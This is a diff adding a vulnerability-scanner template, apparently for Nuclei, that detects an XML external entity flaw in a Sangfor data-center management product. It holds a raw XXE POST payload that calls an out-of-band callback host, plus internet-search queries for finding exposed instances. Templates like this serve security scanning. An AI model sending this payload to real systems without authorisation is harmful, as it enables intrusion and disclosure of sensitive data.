@@ -1,0 +1,42 @@
+id: sangfor-dc-sangforindex-xxe
+
+info:
+  name: sangfor 深信服数据中心管理系统 DC - xxe
+  author: hufei
+  severity: critical
+  description: 深信服数据中心管理系统DC存在XML外部实体注入漏洞。由于后端对传入的XML对象进行了非预期内解析，攻击者可以利用该漏洞进行XML注入攻击，获取系统敏感信息。
+  reference:
+    https://blog.csdn.net/qq_41904294/article/details/132310337
+  metadata:
+    max-request: 3
+    hunter-query:
+    verified: true
+    fofa-query: "SANGFOR 数据中心"
+  tags: sangfor,2023,xxe,sangfor,iot,dc,oob
+
+variables:
+  dns: "{{interactsh-url}}"
+  cmd: "ping {{dns}}"
+
+http:
+  - raw:
+      - |
+        POST /src/sangforindex HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="utf-8" ?>
+        <!DOCTYPE root [
+            <!ENTITY rt SYSTEM "http://{{dns}}">
+        ]>
+        <xxx>
+        &rt;
+        </xxx>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
